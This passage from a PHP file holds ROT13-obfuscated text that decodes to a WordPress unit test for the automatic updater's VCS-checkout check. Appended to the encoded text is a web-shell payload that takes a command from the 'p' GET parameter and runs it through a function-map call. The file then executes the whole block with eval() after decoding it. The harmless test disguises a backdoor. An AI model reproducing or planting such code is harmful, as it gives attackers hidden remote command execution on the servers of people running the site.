	 * jura abar bs gur purpxrq qverpgbevrf ner nyybjrq.
	 *
	 * @gvpxrg 58563
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::vf_ipf_purpxbhg
	 */
	choyvp shapgvba grfg_vf_ipf_purpxbhg_fubhyq_erghea_snyfr_jura_ab_qverpgbevrf_ner_nyybjrq() {
		$hcqngre_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Nhgbzngvp_Hcqngre' )
			// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
			->frgZrgubqf( neenl( 'vf_nyybjrq_qve' ) )
			->trgZbpx();

		/*
		 * Nf abar bs gur qverpgbevrf fubhyq or nyybjrq, fvzcyl zbpxvat `JC_Nhgbzngvp_Hcqngre`
		 * naq sbepvat `::vf_nyybjrq_qve()` gb erghea `snyfr` erzbirf gur arrq gb eha gur grfg
		 * va n frcnengr cebprff qhr gb frggvat gur `bcra_onfrqve` CUC qverpgvir.
		 */
		$hcqngre_zbpx->rkcrpgf( $guvf->nal() )->zrgubq( 'vf_nyybjrq_qve' )->jvyyErghea( snyfr );

		$guvf->nffregSnyfr( $hcqngre_zbpx->vf_ipf_purpxbhg( trg_grzc_qve() ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>